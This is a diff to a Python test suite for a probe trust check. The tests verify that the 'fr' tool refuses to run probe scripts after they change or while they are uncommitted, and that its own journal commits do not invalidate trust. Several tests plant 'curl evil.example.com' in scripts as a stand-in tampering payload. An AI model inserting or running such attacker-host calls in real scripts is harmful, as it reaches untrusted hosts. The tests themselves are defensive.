@@ -22,6 +22,7 @@ from fr.journal.model import journal_path
 from fr.ops.load import LoadedOp, OpsConfig, load_ops
 from fr.ops.model import Op
 from fr.ops.trust import (
+    CODE_KEY,
     CONFIG_KEY,
     Trusted,
     diff,
@@ -61,7 +62,13 @@ def _repo(tmp_path: Path) -> Path:
     (tmp_path / ".fr/ops.yaml").write_text(CONFIG)
     (tmp_path / "scripts").mkdir()
     (tmp_path / "scripts/probe.sh").write_text("true\n")
+    _commit(tmp_path)
     return tmp_path
+
+
+def _commit(root: Path, message: str = "seed") -> None:
+    subprocess.run(["git", "-C", str(root), "add", "-A"], check=True)
+    subprocess.run(["git", "-C", str(root), "commit", "-qm", message], check=True)
 
 
 def _lo(**fields: object) -> LoadedOp:
@@ -287,10 +294,62 @@ def test_status_refuses_after_a_referenced_script_changes(tmp_path: Path, monkey
     root = _repo(tmp_path)
     _trust(root, monkeypatch)
     (root / "scripts/probe.sh").write_text("curl evil.example.com\n")
+    _commit(root, "edit the probe script")
     result = _status(root, monkeypatch)
     assert result.exit_code == 2
-    assert "changed: file:scripts/probe.sh" in result.output
+    assert "file:scripts/probe.sh" in result.output
     assert not (root / "probe-ran").exists()
+
+
+def test_status_refuses_while_a_code_path_is_uncommitted(tmp_path: Path, monkeypatch) -> None:
+    """Addendum 2 (f): a probe runs only against committed code."""
+    root = _repo(tmp_path)
+    _trust(root, monkeypatch)
+    (root / "scripts/probe.sh").write_text("curl evil.example.com\n")
+    (root / "Makefile").write_text("check:\n\ttrue\n")
+    result = _status(root, monkeypatch)
+    assert result.exit_code == 2
+    assert "scripts/probe.sh" in result.output and "Makefile" in result.output
+    assert "uncommitted" in result.output
+    assert not (root / "probe-ran").exists()
+
+
+def test_trust_refuses_while_a_code_path_is_uncommitted(tmp_path: Path, monkeypatch) -> None:
+    root = _repo(tmp_path)
+    (root / "Makefile").write_text("check:\n\ttrue\n")
+    result = _trust(root, monkeypatch)
+    assert result.exit_code == 2 and "Makefile" in result.output
+    assert load_trust(root, "p") is None
+
+
+def test_status_refuses_after_any_committed_code_change_and_lists_it(
+    tmp_path: Path, monkeypatch
+) -> None:
+    """Addendum 2 (e): an indirect dependency (`make check`, `python -m pkg`, a sourced
+    script) no token names still moves the committed code tree."""
+    root = _repo(tmp_path)
+    _trust(root, monkeypatch)
+    (root / "lib").mkdir()
+    (root / "lib/helper.sh").write_text("curl evil.example.com\n")
+    _commit(root, "an unreferenced helper")
+    result = _status(root, monkeypatch)
+    assert result.exit_code == 2
+    assert f"changed: {CODE_KEY}" in result.output
+    assert "lib/helper.sh" in result.output
+    assert not (root / "probe-ran").exists()
+
+
+def test_frs_own_journal_commits_do_not_invalidate_trust(tmp_path: Path, monkeypatch) -> None:
+    """Addendum 2 (g): fr's artifact trees are not code."""
+    from fr.ops.evidence import record_op
+
+    root = _repo(tmp_path)
+    _trust(root, monkeypatch)
+    record_op(root, "p", op="create-key", result="done", phase="pre-merge")
+    _commit(root, "chore(fr): op evidence")
+    result = _status(root, monkeypatch)
+    assert result.exit_code == 0, result.output
+    assert (root / "probe-ran").exists()
 
 
 def test_status_refuses_after_a_probe_setting_changes(tmp_path: Path, monkeypatch) -> None:
@@ -298,6 +357,7 @@ def test_status_refuses_after_a_probe_setting_changes(tmp_path: Path, monkeypatc
     root = _repo(tmp_path)
     _trust(root, monkeypatch)
     (root / ".fr/ops.yaml").write_text(CONFIG + "env_passthrough: [AWS_PROFILE]\n")
+    _commit(root, "pass AWS_PROFILE")
     result = _status(root, monkeypatch)
     assert result.exit_code == 2
-    assert f"changed: {CONFIG_KEY}" in result.output
+    assert CONFIG_KEY in result.output.split("changed:")[1]
